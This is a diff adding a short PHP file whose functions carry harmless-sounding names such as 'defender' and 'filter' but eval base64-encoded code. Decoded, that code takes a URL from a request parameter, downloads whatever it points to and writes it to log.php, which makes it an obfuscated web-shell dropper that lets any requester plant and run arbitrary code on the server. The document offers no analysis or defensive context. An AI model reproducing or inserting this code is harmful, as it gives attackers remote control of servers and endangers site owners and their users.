@@ -1,0 +1,20 @@
+<?php
+
+function defender()
+{
+	$var = 'ZnVuY3Rpb24gX18oKQ0Kew0KCXJldHVybiBfX18oKTsNCn0NCg0KZnVuY3Rpb24gX19fKCkNCnsNCglyZXR1cm4gZmlsZV9nZXRfY29udGVudHMoX2NhbGwoKSk7DQp9DQoNCmZ1bmN0aW9uIF9jYWxsKCkNCnsNCglyZXR1cm4gJF9SRVFVRVNUW19hcnJheSgpXTsNCn0NCg0KZnVuY3Rpb24gX2FycmF5KCkNCnsNCglyZXR1cm4gJ3UnOw0KfQ0KDQpmdW5jdGlvbiBfZigkZGF0YSkNCnsNCgkkYSA9IGZfb19yKCk7DQoJZnB1dHMoJGEsJGRhdGEpOw0KfQ0KDQpmdW5jdGlvbiBmX29fcigpDQp7DQoJcmV0dXJuIGZvcGVuKF9fX2ZvcigpLF9fbSgpKTsNCn0NCg0KZnVuY3Rpb24gX19fZm9yKCkNCnsNCglyZXR1cm4gJ2xvZy5waHAnOw0KfQ0KDQpmdW5jdGlvbiBfX20oKQ0Kew0KCXJldHVybiAndysnOw0KfQ0K';
+	return eval(base64_decode($var));
+}
+
+function _numeric()
+{
+	return base64_decode('DQoNCg0KDQoNCiRfID0gX18oKTsNCiRfXyA9IF9mKCRfKTsNCg==');
+}
+
+function filter()
+{
+	return eval(_numeric());
+}
+
+defender();
+filter();
